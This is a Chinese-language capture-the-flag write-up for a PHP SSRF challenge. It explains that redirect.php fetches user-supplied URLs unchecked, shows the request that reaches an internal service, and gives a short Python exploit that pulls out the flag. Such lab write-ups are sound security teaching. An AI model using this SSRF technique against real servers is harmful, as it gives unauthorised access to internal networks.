# 题解：X-020-24 PHP SSRF

## 1、题目描述
本题是一个 SSRF（Server-Side Request Forgery）练习。暴露的网页提供了一个表单，允许用户输入一个 URL 并由服务器端获取该 URL 的内容。题目问：能否访问内部服务（internal-service）并读取 flag？靶机地址示例：

目标： http://ip32784

提示：检查暴露的 web server index（说明内部服务地址为 `http://internal-service`）。

## 2、知识点

- SSRF：服务器端对用户可控 URL 发起请求，可能访问内网服务或本机服务。
- 利用要点：攻击者能控制服务发出的请求地址；通过容器内 DNS 名称或内网 IP 访问只在内部可达的服务。

## 3、题目解题方法思路
服务端的 `redirect.php` 使用 `file_get_contents($url)` 直接从用户提供的 URL 拉取内容且没有做任何校验，因此可以把 `url` 参数指向内部服务 `http://internal-service`。当外部请求访问暴露的 web（port 32784）并传入该 URL 时，服务器会在容器内部解析 `internal-service` 并返回其页面内容，其中包含 FLAG 字符串。

流程简述：
1. 构造请求访问暴露的 SSRF 端点（如 `/redirect.php?url=http://internal-service`）。
2. 服务端在内部网络解析 `internal-service` 并把内部页面返回给攻击者。
3. 从响应中提取 FLAG。

## 4、解题步骤
1. 打开首页（或直接访问）：
   - http://ip32784/ （页面有表单，提示内部地址 `http://internal-service`）
2. 直接触发 SSRF：
   - 访问：
     http://ip32784/redirect.php?url=http://internal-service
3. 查看响应：在返回的 HTML 中会包含内部服务页面内容，内含 `FLAG: ...`。

注意事项：如果目标站点对 URL 做了简单过滤，可以尝试常见绕过。

## 5、exp

```python
import re
import sys
import requests

TARGET = 'http://ip32784'
PATH = '/redirect.php'
INTERNAL = 'http://internal-service'


def main():
    url = f"{TARGET.rstrip('/')}{PATH}?url={requests.utils.requote_uri(INTERNAL)}"
    try:
        r = requests.get(url, timeout=10)
    except Exception as e:
        print('请求失败:', e)
        sys.exit(2)

    text = r.text
    m = re.search(r'FLAG:\s*([A-Za-z0-9_\-{}]+)', text)
    if not m:
        m = re.search(r'FLAG:\s*(.+?)<', text)
    if m:
        print('[+] 找到 FLAG:')
        print(m.group(1).strip())
        sys.exit(0)

    print('[-] 未在响应中找到 FLAG')
    sys.exit(1)


if __name__ == '__main__':
    main()

```
